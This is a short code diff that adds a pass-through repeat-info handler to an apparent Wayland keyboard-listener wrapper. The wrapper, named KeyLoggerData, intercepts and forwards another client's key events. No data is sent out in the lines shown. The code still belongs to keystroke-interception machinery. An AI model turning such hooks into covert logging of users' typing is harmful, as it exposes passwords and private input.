@@ -109,6 +109,10 @@ void MyHandleKeyboardModifiers(void* data, wl_keyboard* keyboard, uint32_t seria
 	KeyLoggerData *d = (KeyLoggerData*) data;
 	((wl_keyboard_listener*) d->implementation)->modifiers(d->data, keyboard, serial, mods_depressed, mods_latched, mods_locked, group);
 }
+void MyHandleKeyboardRepeatInfo(void* data, wl_keyboard* keyboard, int32_t rate, int32_t delay) {
+	KeyLoggerData *d = (KeyLoggerData*) data;
+	((wl_keyboard_listener*) d->implementation)->repeat_info(d->data, keyboard, rate, delay);
+}
 
 wl_keyboard_listener my_keyboard_listener = {
 	MyHandleKeyboardKeymap,
@@ -116,6 +120,7 @@ wl_keyboard_listener my_keyboard_listener = {
 	MyHandleKeyboardLeave,
 	MyHandleKeyboardKey,
 	MyHandleKeyboardModifiers,
+	MyHandleKeyboardRepeatInfo,
 };
 
 struct wl_proxy* g_keyboard_to_log = NULL;
